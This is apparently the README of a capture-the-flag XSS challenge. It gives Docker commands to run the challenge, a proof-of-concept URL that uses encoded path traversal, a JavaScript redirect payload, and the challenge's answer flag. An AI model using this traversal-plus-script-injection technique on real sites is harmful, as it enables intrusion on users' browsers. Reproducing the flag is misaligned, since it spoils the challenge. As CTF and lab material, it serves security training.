
## RUN
```bash
docker build -t xss1 .
docker tag xss1 ccr.ccs.tencentyun.com/360ctf/xss1
docker run -it --rm -p 5000:5000 --name xss1 xss1
```

## PoC

URL:
http://localhost:5000/e22e29eb-d62f-4e90-848d-e9b9f0af94f9/view/1553283436/a/..%2F..%2F..%2Fhome/


Content:
```txt
location.href='http://baidu.com';//
```

flag{9a7b7c9426594503c76a89bd70d0700a}